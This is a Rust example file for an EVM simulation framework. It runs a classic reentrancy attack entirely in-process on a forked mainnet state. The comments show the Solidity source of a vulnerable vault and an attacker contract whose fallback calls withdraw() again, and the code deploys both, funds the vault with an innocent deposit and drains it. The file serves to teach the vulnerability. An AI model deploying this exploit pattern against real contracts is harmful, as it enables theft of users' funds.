use evm_common::{address::addr, word::Word};
use solenoid::{
    eth,
    ext::{Account, Ext},
    solenoid::{Builder, Solenoid},
};

// This example demonstrates a classic reentrancy attack using solenoid — a Rust EVM
// simulation framework. We run real Solidity contracts entirely in-process against a
// fork of mainnet state, without broadcasting any transaction to the network.
//
// The attack exploits a well-known vulnerability pattern:
//
//   contract Vulnerable {
//       mapping(address => uint256) public balances;
//
//       function withdraw() public {
//           uint256 balance = balances[msg.sender];
//           require(balance >= 1 ether);
//           (bool ok, ) = msg.sender.call{value: balance}("");  // <-- external call
//           require(ok);
//           balances[msg.sender] = 0;                           // <-- too late!
//       }
//   }
//
// The state update (`balances[msg.sender] = 0`) happens AFTER the external call.
// A malicious contract can re-enter `withdraw()` before the balance is cleared,
// draining the vault multiple times with a single transaction.
//
// The Attacker contract exploits this via its fallback:
//
//   contract Attacker {
//       address private target;
//       uint256 private limit;
//
//       function attack(address _target) public payable {
//           target = _target;
//           limit = msg.value;
//           Vulnerable(target).deposit{value: limit}();
//           Vulnerable(target).withdraw();           // kicks off the chain
//       }
//
//       fallback() external payable {
//           if (address(target).balance >= limit) {  // vault still has ETH?
//               Vulnerable(target).withdraw();       // re-enter before balance clears
//           }
//       }
//   }
//
// The attack exploits this in three steps:
//   1. Deposit `limit` ETH into Vulnerable to register a legitimate balance.
//   2. Call `withdraw()` — Vulnerable sends ETH and triggers the Attacker's fallback.
//   3. Inside fallback: if Vulnerable still holds ETH, call `withdraw()` again.
//      Because `balances[attacker]` was never zeroed, the re-check passes every time.
//      This recurses until Vulnerable is drained below `limit`.

#[tokio::main]
async fn main() -> eyre::Result<()> {
    dotenv::dotenv().ok();
    tracing_subscriber::fmt::init();

    // Three actors:
    //   aa — the attacker (deploys and controls the Attacker contract)
    //   bb — an innocent depositor (funds the Vulnerable contract)
    //   cc — a neutral deployer for the Vulnerable contract
    let aa = addr("0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    let bb = addr("0xBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB");
    let cc = addr("0xCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC");

    // Fork state from the latest block. All on-chain accounts and storage are
    // available; reads that miss the local cache are fetched lazily via JSON-RPC.
    let url = std::env::var("URL")?;
    let eth = eth::EthClient::new(&url);
    let mut ext = Ext::at_latest(eth).await?;

    // Fund all three actors with 2 ETH each so they can pay for gas and value transfers.
    let one = Word::from(10u64.pow(18));
    let two = Word::from(2 * 10u64.pow(18));
    ext.state.insert(aa, Account { value: two, ..Default::default() });
    ext.state.insert(bb, Account { value: two, ..Default::default() });
    ext.state.insert(cc, Account { value: two, ..Default::default() });

    // --- Deploy Vulnerable ---
    // cc deploys the vault contract. The constructor takes no ETH (value = 0).
    // After deployment, the contract sits empty — no deposits yet.
    let code = include_str!("../etc/reentrancy/Vulnerable.bin");
    let code = hex::decode(code.trim_start_matches("0x"))?;
    let r = Solenoid::new()
        .create(code)
        .with_sender(cc)
        .with_gas(Word::from(1_000_000))
        .with_value(Word::zero())
        .ready()
        .apply(&mut ext)
        .await?;
    println!("Target: OK={:#?}", !r.evm.reverted);

    // The deployed address is deterministic: keccak(rlp(deployer, nonce)).
    let target = ext
        .created_accounts
        .first()
        .copied()
        .ok_or_else(|| eyre::eyre!("No address returned"))?;
    println!("Target: {target}");

    // Sanity check: verify the runtime bytecode was stored correctly.
    let expected = include_str!("../etc/reentrancy/Vulnerable.bin-runtime");
    let expected = hex::decode(expected.trim_start_matches("0x"))?;
    assert_eq!(ext.code(&target).await?.0.len(), expected.len(), "target code mismatch");

    // --- Deploy Attacker ---
    // aa deploys the attack contract. No ETH is sent at construction time —
    // the attack funds are supplied later via the `attack()` call.
    let code = include_str!("../etc/reentrancy/Attacker.bin");
    let code = hex::decode(code.trim_start_matches("0x"))?;
    let r = Solenoid::new()
        .create(code)
        .with_sender(aa)
        .with_gas(Word::from(1_000_000))
        .with_value(Word::zero())
        .ready()
        .apply(&mut ext)
        .await?;
    println!("Attack: OK={}", !r.evm.reverted);

    let attack = ext
        .created_accounts
        .get(1)
        .copied()
        .ok_or_else(|| eyre::eyre!("No address returned"))?;
    println!("Attack: {attack}");

    // Sanity check: verify the Attacker runtime bytecode as well.
    let expected = include_str!("../etc/reentrancy/Attacker.bin-runtime");
    let expected = hex::decode(expected.trim_start_matches("0x"))?;
    assert_eq!(ext.code(&attack).await?.0.len(), expected.len(), "attack code mismatch");

    println!("---");

    // --- Innocent deposit ---
    // bb deposits 8 ETH into Vulnerable. This is the prize the attacker is after.
    // After this call: Vulnerable.balances[bb] = 8 ETH, Vulnerable.balance = 8 ETH.
    let _ = Solenoid::new()
        .execute(target, "deposit()", &[])
        .with_sender(bb)
        .with_gas(Word::from(1_000_000))
        .with_value(one * Word::from(8))
        .ready()
        .apply(&mut ext)
        .await?;

    let balance = ext.balance(&target).await?;
    println!("Target balance: {}", format_eth(&balance));
    let balance = ext.balance(&attack).await?;
    println!("Attack balance: {}", format_eth(&balance));

    println!("---");

    // --- Execute the attack ---
    // aa calls attack(target) with 1 ETH. Inside:
    //   1. Attacker.deposit{value: 1 ETH}()  →  Vulnerable.balances[attacker] = 1 ETH
    //   2. Attacker.withdraw()               →  Vulnerable sends 1 ETH, triggers fallback
    //   3. fallback: target.balance (8) >= limit (1)  →  withdraw() again  [re-enter]
    //   4. fallback: target.balance (7) >= limit (1)  →  withdraw() again  [re-enter]
    //      ... repeats until target.balance drops below limit ...
    //   N. fallback: target.balance (0) < limit (1)   →  stop recursion
    //
    // On the way out, each withdraw() frame sets balances[attacker] = 0.
    // Because it's an assignment (not a subtraction), this is safe at every depth.
    // The attacker entered with 1 ETH and exits with 1 + 8 = 9 ETH.
    let r = Solenoid::new()
        .execute(attack, "attack(address)", &target.as_word().into_bytes())
        .with_sender(aa)
        .with_gas(Word::from(1_000_000))
        .with_value(one)
        .ready()
        .apply(&mut ext)
        .await?;
    println!("Attack: OK={:#?} {}", !r.evm.reverted, format_eth(&one));

    // After a successful attack: Vulnerable should be empty, Attacker holds all the ETH.
    let balance = ext.balance(&target).await?;
    println!("Target balance: {}", format_eth(&balance));
    let balance = ext.balance(&attack).await?;
    println!("Attack balance: {}", format_eth(&balance));

    Ok(())
}

fn format_eth(word: &Word) -> String {
    let base = Word::from(10u64.pow(18));
    let before = *word / base;
    let after = *word % base;
    format!("{}.{} ETH", before.as_u64(), after.as_u64())
}
